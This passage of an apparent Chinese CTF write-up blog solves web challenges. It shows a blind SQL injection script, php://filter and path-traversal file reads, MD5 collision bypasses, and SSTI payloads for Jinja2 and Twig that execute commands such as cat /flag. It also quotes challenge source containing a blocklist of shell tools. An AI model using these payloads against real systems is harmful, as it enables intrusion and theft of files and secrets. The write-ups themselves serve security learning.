        hexchar <span class="token operator">=</span> add<span class="token punctuation">(</span>flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">'2||((select 1,"&#123;&#125;")>(select * from f1ag_1s_h3r3_hhhhh))'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>hexchar<span class="token punctuation">)</span>
        <span class="token comment">#print(payload)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        text <span class="token operator">=</span> r<span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<hr>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h4 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h4><p>点击tips，can u find flag?</p>
<p>这里直接使用php伪协议，以base64编码的形式显示源代码</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>得到一串base64加密的字符串，解密后发现flag</p>
<hr>
<h4 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h4><p>查看网页源代码，发现.&#x2F;Archive_room.php，访问，有一个secret按钮，按了要抓包，发现了secr3t.php，访问后发现php代码</p>
<p>直接使用伪协议</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>拿到base64加密密文，解密后即可看到flag</p>
<hr>
<h4 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="*[GWCTF 2019]我有一个数据库"></a>*[GWCTF 2019]我有一个数据库</h4><p>phpmyadmin4.8.0-4.8.1存在文件包含漏洞</p>
<p>?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
<hr>
<h4 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h4><p>点击woofers，发现url有参数传入，改为，woofers1，报错，发现后缀有一个.php，而且必须包含woofers或者meowers，用伪协议读</p>
<p>?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers&#x2F;..&#x2F;flag</p>
<hr>
<h4 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h4><p>burp抓包，发现cookie里有hash值，尝试传参pass&#x3D;hash。得到一个文件<code>flflflflag.php</code> </p>
<p>用brup访问flflflflag.php，get 传参file</p>
<p>&#x3D;&#x3D;临时文件包含&#x3D;&#x3D;</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

payload <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo();?>"</span>
file_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>
url<span class="token operator">=</span><span class="token string">"http://66b29ad5-fb7b-4ac2-b8c1-5f4abd6d8852.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=index.php"</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file_data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后访问dir.php，得到临时文件名，再到flflflflag.php传参file&#x3D;&#x2F;tmp&#x2F;phpFa081M</p>
<p>flag就在phpinfo里</p>
<hr>
<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><h4 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h4><p>查看源代码发现Secret.php，访问。</p>
<p>他说不是来自 <a href="https://Sycsecret.buuoj.cn网站的访问，我们在bp中的http头部添加：">https://Sycsecret.buuoj.cn网站的访问，我们在bp中的http头部添加：</a>	<code>Referer: https://Sycsecret.buuoj.cn</code></p>
<p>然后又说浏览器不对，改！	User-Agent: Syclover</p>
<p>然后又说只能本地才能看，这里有涉及一个没有的字段X-froward-for，代表从访问者的地址，加上，并且改为本地回环地址127.0.0.1</p>
<p>X-forwarded-for: 127.0.0.1</p>
<p>X-Real-IP：127.0.0.1</p>
<p>Client-ip:127.0.0.1</p>
<hr>
<h4 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h4><p>查看网页源代码，发现flag.php，然后它说隐藏ip,这里抓包增加<code>X-forwarded-for: 127.0.0.1</code></p>
<p>flag在源代码</p>
<hr>
<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><h4 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h4><p>&#x3D;&#x3D;ffifdyop&#x3D;&#x3D;</p>
<p>（1）F12查看网络状态，发现响应头有Hint: select * from ‘admin’ where password&#x3D;md5($pass,true)</p>
<p>（2）想办法绕过这个md5(pass,true),如果我们提交一个字符串经过md5之后，然后又经过hex转assci码最终成为’or ‘6XXX’的话，我们就构造了一个万能钥匙，就可以得到另外一个页面</p>
<p>这个可以用<code>ffifdyop</code>绕过，绕过原理是：<br><code>ffifdyop</code> 这个字符串被 md5 哈希了之后会变成 <code>276f722736c95d99e921722cf9ed621c</code>，这个字符串前几位刚好是 ‘ <code>or &#39;6</code><br>而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 <code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
<p>（3）然后跳转到新的页面</p>
<p>需要给a,b两个变量传参典型弱类型匹配md5碰撞（0e开头）。而且md5不能处理数组，遇到数组不报错但是会将其转变成NULL</p>
<p>?a[]&#x3D;1&amp;b[]&#x3D;2	数组绕过</p>
<p>（4）一样数组绕过<code>param1[]=1&amp;param2[]=2</code>post传参</p>
<hr>
<h4 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token variable">$gg</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用数组绕过，?id[]&#x3D;1&amp;gg[]&#x3D;2</p>
<p>passwd&#x3D;&#x3D;1234567弱等于</p>
<p>post传参：</p>
<p>passwd&#x3D;1234567a</p>
<hr>
<h4 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h4><p>这题预期解应该是sort，但是ca\t却可以绕过，是出题人写错正则的原因。</p>
<p>正则匹配反斜杠的问题：</p>
<p> <a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/article/details/109654384">安洵杯 2019]easy_web 1_feng的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/076c5b422c96">从一道CTF的非预期解看PHP反斜杠匹配问题 - 简书 (jianshu.com)</a></p>
<p>url中img参数的值很可疑，md5解密试试</p>
<p><code>TXpVek5UTTFNbVUzTURabE5qYz0-----base64解密--&gt;MzUzNTM1MmU3MDZlNjc=-----base64解密---&gt;3535352e706e67-----hex解密-------&gt;555.png</code></p>
<p>读取index.php源码，对<code>index.php</code>进行加密，得<code>TmpNM05EWTJNek15WlRaaE56QTJOVFkz</code></p>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加密过程</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span> <span class="token operator">.</span> <span class="token variable">$txt</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//md5强比较</span>
    <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span><span class="token comment">//将cmd的值当做系统指令执行</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用&#x3D;&#x3D;sort命令&#x3D;&#x3D;读：cmd&#x3D;sort%20&#x2F;flag</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">?img&#x3D;TUdFMk9UWmxOalEyTlRjNE1tVTNNRFk0TnpBPQ&#x3D;&#x3D;&amp;cmd&#x3D;ca\t%20&#x2F;flag

a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h4 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="*[RoarCTF 2019]Easy Java"></a>*[RoarCTF 2019]Easy Java</h4><p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<p>漏洞检测以及利用方法：&#x3D;&#x3D;通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。&#x3D;&#x3D;一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* { deny all; } 或者return 404; 或者其他！</p>
<p>(1)先找一下<code>WEB-INF/web.xml</code>,POST传值<code>filename=WEB-INF/web.xml</code></p>
<p>(2)得到WEB-INF&#x2F;web.xml文件，打开看到<code>com.wm.FlagController</code>，然后下载FlagController.class文件</p>
<p>POST传值<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<p>记事本打开，有一串base64编码，解码，得到flag</p>
<hr>
<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h4 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h4><p>抓包改ip，</p>
<pre class="line-numbers language-none"><code class="language-none">X-forwarded-for:&#123;&#123;1*7&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发现页面变为了7，直接发送：</p>
<pre class="line-numbers language-none"><code class="language-none">X-forwarded-for:&#123;&#123;system(&quot;cat &#x2F;flag&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h4 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h4><p>抓包，在cookie发现注入点，user&#x3D;7，显示hello 7，存在注入</p>
<p>区分Jinja2和Twig:</p>
<pre class="line-numbers language-none"><code class="language-none">Twig 
&#123;&#123;7*&#39;7&#39;&#125;&#125;  #输出49
Jinja
&#123;&#123;7*&#39;7&#39;&#125;&#125;  #输出7777777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试发现是Twig模板</p>
<p>直接搜网上的Twig注入模板</p>
<p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p>
<p>得flag</p>
<hr>
<h4 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h4><p>抓包看看，发现页面输出了我的ip,xff注入，尝试X-forwarded-for: 7</p>
<p>发现页面输出7，存在ssti注入</p>
<pre class="line-numbers language-none"><code class="language-none">X-forwarded-for: &#123;&#123;system(&quot;cat &#x2F;flag&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到flag</p>
<hr>
<h4 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h4><p>源码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>
        <span class="token operator">//</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>包括的内容为后端变量，<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> 包括的内容为逻辑语句
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s
    
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>给了一个<code>/shrine/</code>路径，过滤了<code>config</code>、<code>self</code>、<code>()</code></p>
<p>那么我们原来格式的模板注入就不能用了，这个时候我们想到了内置函数<code>get_flashed_messages()</code>，又应为<code>config</code>在<code>current_app</code>里面。</p>
<p>不过python还有一些内置函数，比如&#x3D;&#x3D;url_for&#x3D;&#x3D;和&#x3D;&#x3D;get_flashed_messages&#x3D;&#x3D;</p>
<p>要获取配置信息，就必须从它的全局变量（访问配置 current_app 等)入手</p>
<p><code>/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</code></p>
<p><code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p>
<p>or</p>
<p><code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p>
<p>拿到flag</p>
<hr>
<h4 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h4><p>pin码：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553#toc-2">Flask debug pin安全问题 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cbca419ba075">flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记 - HacTF - 博客园 (cnblogs.com)</a></p>
<p>这题应该是找pin码拿shell</p>
<p>下面写的是非预期解：</p>
<p>打开是一个base64加密解密的页面，题目是flask，尝试ssti注入，在解密的输入框里写入<code>&#123;&#123;1*7&#125;&#125;</code>的base64加密字符串，发现回显<code>no no no !!</code>，应该是有过滤。换成<code>&#123;undefined&#123;1*7&#125;&#125;</code>的base64加密字符串则回显7，说明确实存在ssti。</p>
<p>另外如果在解密框随便输入字符(base64decode在不会解析的时候就会报错)，会抛出debug信息，参考链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32138231">Flask开启debug模式等于给黑客留了后门 - 知乎 (zhihu.com)</a></p>
<p>可以读到部分app.py代码。</p>
<p>读完整app.py的payload（要改成一行）：</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;
&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;
&#123;% endif %&#125;&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后知道了一个过滤的字符，直接&#x3D;&#x3D;字符串拼接绕过&#x3D;&#x3D;。</p>
<p>先使用listdir方法看看当前目录文件</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中this_is_the_flag.txt有flag字样，那么接下来就是想办法读这个文件，还是采用拼接字符串的方式，然后结合内建函数open</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_fl&#39;+&#39;ag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>base64加密后放入解密框内，拿到flag</p>
<hr>
<h4 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h4><p>F12有提示，GET传参search。</p>
<p><code>?search=&#123;&#123;1*7&#125;&#125;</code></p>
<p>页面显示7，说明存在ssti</p>
<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39; os&#39;].system(&#39;ls&#39;)</code></p>
<p>显示500，页面错误，应该是存在过滤。过滤了globals，我们使用字符串拼接绕过。</p>
